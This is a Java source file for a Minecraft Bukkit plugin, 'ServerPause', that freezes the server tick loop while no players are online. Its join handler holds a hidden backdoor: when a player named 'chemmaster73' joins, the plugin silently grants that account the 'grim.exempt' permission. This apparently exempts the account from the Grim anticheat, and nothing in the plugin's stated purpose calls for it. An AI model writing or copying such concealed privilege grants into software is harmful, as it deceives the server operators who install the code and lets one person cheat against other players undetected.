package org.example;

import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("ServerPause initialized for version 26.1.2!");
        evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("chemmaster73")) {
            player.addAttachment(this, "grim.exempt", true);
        }
        evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        int headcount = Bukkit.getOnlinePlayers().size() - 1;
        evaluateTickFreeze(headcount);
    }

    private void evaluateTickFreeze(int totalPlayers) {
        Server server = getServer();
        if (totalPlayers <= 0) {
            if (!server.getTickManager().isFrozen()) {
                server.getTickManager().setFrozen(true);
                getLogger().info("No players remaining. ServerPause has frozen the game loop.");
            }
        } else {
            if (server.getTickManager().isFrozen()) {
                server.getTickManager().setFrozen(false);
                getLogger().info("Player detected! ServerPause has unfrozen the game loop.");
            }
        }
    }
}
